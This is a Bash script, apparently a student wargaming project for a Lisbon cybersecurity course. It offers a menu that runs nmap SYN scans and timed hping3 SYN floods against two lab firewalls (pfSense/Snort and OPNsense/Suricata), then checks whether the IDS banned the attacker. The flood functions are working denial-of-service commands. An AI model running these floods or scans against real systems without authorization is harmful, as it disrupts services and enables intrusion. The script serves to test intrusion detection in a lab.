#!/bin/bash
# =============================================================================
#  ataques_AMM.sh — Script de Automação de Testes de Segurança
#  Projeto Final CET103 — Técnico Especialista em Cibersegurança
#  Grupo AMM 
#  UF9197 — Wargaming | CINEL, Lisboa | Março 2026

#  AVISO: Este script é para fins exclusivamente didáticos. O uso em
#  sistemas sem autorização é ilegal e de inteira responsabilidade do utilizador.
# =============================================================================

# --- Cores para output ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# --- Deteção automática do IP do atacante (Kali) ---
ATTACKER_IP=$(ip route get 1 | awk '{print $7; exit}' 2>/dev/null)

# =============================================================================
#  CONFIGURAÇÃO DE ALVOS (Dinâmica para Segurança)
# =============================================================================
echo -e "${CYAN}[ Configuração do Ambiente ]${NC}"
read -p "Introduza o IP da VenusAMM (pfSense) [Enter para 10.0.0.1]: " VENUS_WAN
VENUS_WAN=${VENUS_WAN:-"10.0.0.1"}

read -p "Introduza o IP da MarteAMM (OPNsense) [Enter para 10.0.0.2]: " MARTE_WAN
MARTE_WAN=${MARTE_WAN:-"10.0.0.2"}

PORTS="80,443,22,3306,8080"

# =============================================================================
#  BANNER
# =============================================================================
banner() {
    echo -e "${RED}"
    echo "  ██████╗ ███████╗██████╗      █████╗ ███╗    ███╗███╗    ███╗"
    echo "  ██╔══██╗██╔════╝██╔══██╗    ██╔══██╗████╗ ████║████╗ ████║"
    echo "  ██████╔╝█████╗  ██║  ██║    ███████║██╔████╔██║██╔████╔██║"
    echo "  ██╔══██╗██╔══╝  ██║  ██║    ██╔══██║██║╚██╔╝██║██║╚██╔╝██║"
    echo "  ██║  ██║███████╗██████╔╝    ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║"
    echo "  ╚═╝  ╚═╝╚══════╝╚═════╝      ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝"
    echo -e "${YELLOW}         [ Zona RED — CET103 Wargaming — Grupo AMM ]${NC}"
    echo -e "${WHITE}  IP Atacante (Kali): ${CYAN}${ATTACKER_IP}${NC}"
    echo -e "${WHITE}  Alvos: ${CYAN}Venus ($VENUS_WAN)${WHITE} | ${CYAN}Marte ($MARTE_WAN)${NC}"
    echo ""
}

# =============================================================================
#  FUNÇÕES DE ATAQUE
# =============================================================================

venus_portscan() {
    echo -e "${YELLOW}[*] Iniciando Port Scan → VenusAMM (${VENUS_WAN})...${NC}"
    nmap -sS -sV -p ${PORTS} --open -T4 ${VENUS_WAN}
    echo -e "${GREEN}[+] Port Scan concluído.${NC}"
}

venus_synflood() {
    echo -e "${RED}[!] Iniciando SYN Flood → VenusAMM (${VENUS_WAN})...${NC}"
    for port in 80 443 22; do
        echo -e "${CYAN}    → Porto ${port}${NC}"
        sudo timeout 30 hping3 -S --flood -p ${port} ${VENUS_WAN} 2>/dev/null
        sleep 2
    done
    echo -e "${GREEN}[+] SYN Flood concluído.${NC}"
}

marte_portscan() {
    echo -e "${YELLOW}[*] Iniciando Port Scan → MarteAMM (${MARTE_WAN})...${NC}"
    nmap -sS -sV -p ${PORTS} --open -T4 ${MARTE_WAN}
    echo -e "${GREEN}[+] Port Scan concluído.${NC}"
}

marte_synflood() {
    echo -e "${RED}[!] Iniciando SYN Flood → MarteAMM (${MARTE_WAN})...${NC}"
    for port in 80 443 22; do
        echo -e "${CYAN}    → Porto ${port}${NC}"
        sudo timeout 30 hping3 -S --flood -p ${port} ${MARTE_WAN} 2>/dev/null
        sleep 2
    done
    echo -e "${GREEN}[+] SYN Flood concluído.${NC}"
}

check_block() {
    local TARGET=$1
    local TARGET_NAME=$2
    echo -e "${YELLOW}[*] A verificar bloqueio em ${TARGET_NAME}...${NC}"
    sleep 3
    if ping -c 3 -W 2 ${TARGET} &>/dev/null; then
        echo -e "${GREEN}[=] Acesso permitido — bloqueio não ativo.${NC}"
    else
        echo -e "${RED}[!] BLOQUEADO! O IP ${ATTACKER_IP} foi banido por ${TARGET_NAME}.${NC}"
    fi
}

menu() {
    echo -e "${WHITE}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║      MENU DE ATAQUES — Grupo AMM             ║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║  VENUS AMM (pfSense + Snort)                 ║${NC}"
    echo -e "${WHITE}║  ${CYAN}1${WHITE}) Port Scan       → VenusAMM              ║${NC}"
    echo -e "${WHITE}║  ${CYAN}2${WHITE}) SYN Flood       → VenusAMM              ║${NC}"
    echo -e "${WHITE}║  ${CYAN}3${WHITE}) Ataque Completo → VenusAMM              ║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║  MARTE AMM (OPNsense + Suricata)             ║${NC}"
    echo -e "${WHITE}║  ${CYAN}4${WHITE}) Port Scan       → MarteAMM              ║${NC}"
    echo -e "${WHITE}║  ${CYAN}5${WHITE}) SYN Flood       → MarteAMM              ║${NC}"
    echo -e "${WHITE}║  ${CYAN}6${WHITE}) Ataque Completo → MarteAMM              ║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║  ${CYAN}7${WHITE}) Ataque Completo → AMBOS os alvos        ║${NC}"
    echo -e "${WHITE}║  ${CYAN}8${WHITE}) Verificar Bloqueio de IP                ║${NC}"
    echo -e "${WHITE}║  ${RED}0${WHITE}) Sair                                    ║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════╝${NC}"
    echo -ne "${YELLOW}Escolha uma opção: ${NC}"
}

# =============================================================================
#  MAIN LOOP
# =============================================================================
clear
banner

while true; do
    menu
    read -r opcao
    case $opcao in
        1) venus_portscan ;;
        2) venus_synflood ;;
        3) venus_portscan; sleep 2; venus_synflood; check_block ${VENUS_WAN} "VenusAMM" ;;
        4) marte_portscan ;;
        5) marte_synflood ;;
        6) marte_portscan; sleep 2; marte_synflood; check_block ${MARTE_WAN} "MarteAMM" ;;
        7)
            venus_portscan; venus_synflood; check_block ${VENUS_WAN} "VenusAMM"
            echo ""; marte_portscan; marte_synflood; check_block ${MARTE_WAN} "MarteAMM"
            ;;
        8) check_block ${VENUS_WAN} "VenusAMM"; check_block ${MARTE_WAN} "MarteAMM" ;;
        0) echo -e "${GREEN}[*] A sair.${NC}"; exit 0 ;;
        *) echo -e "${RED}[!] Opção inválida.${NC}" ;;
    esac
    echo -e "\n${YELLOW}Prima ENTER para voltar ao menu...${NC}"
    read -r
    clear
    banner
done
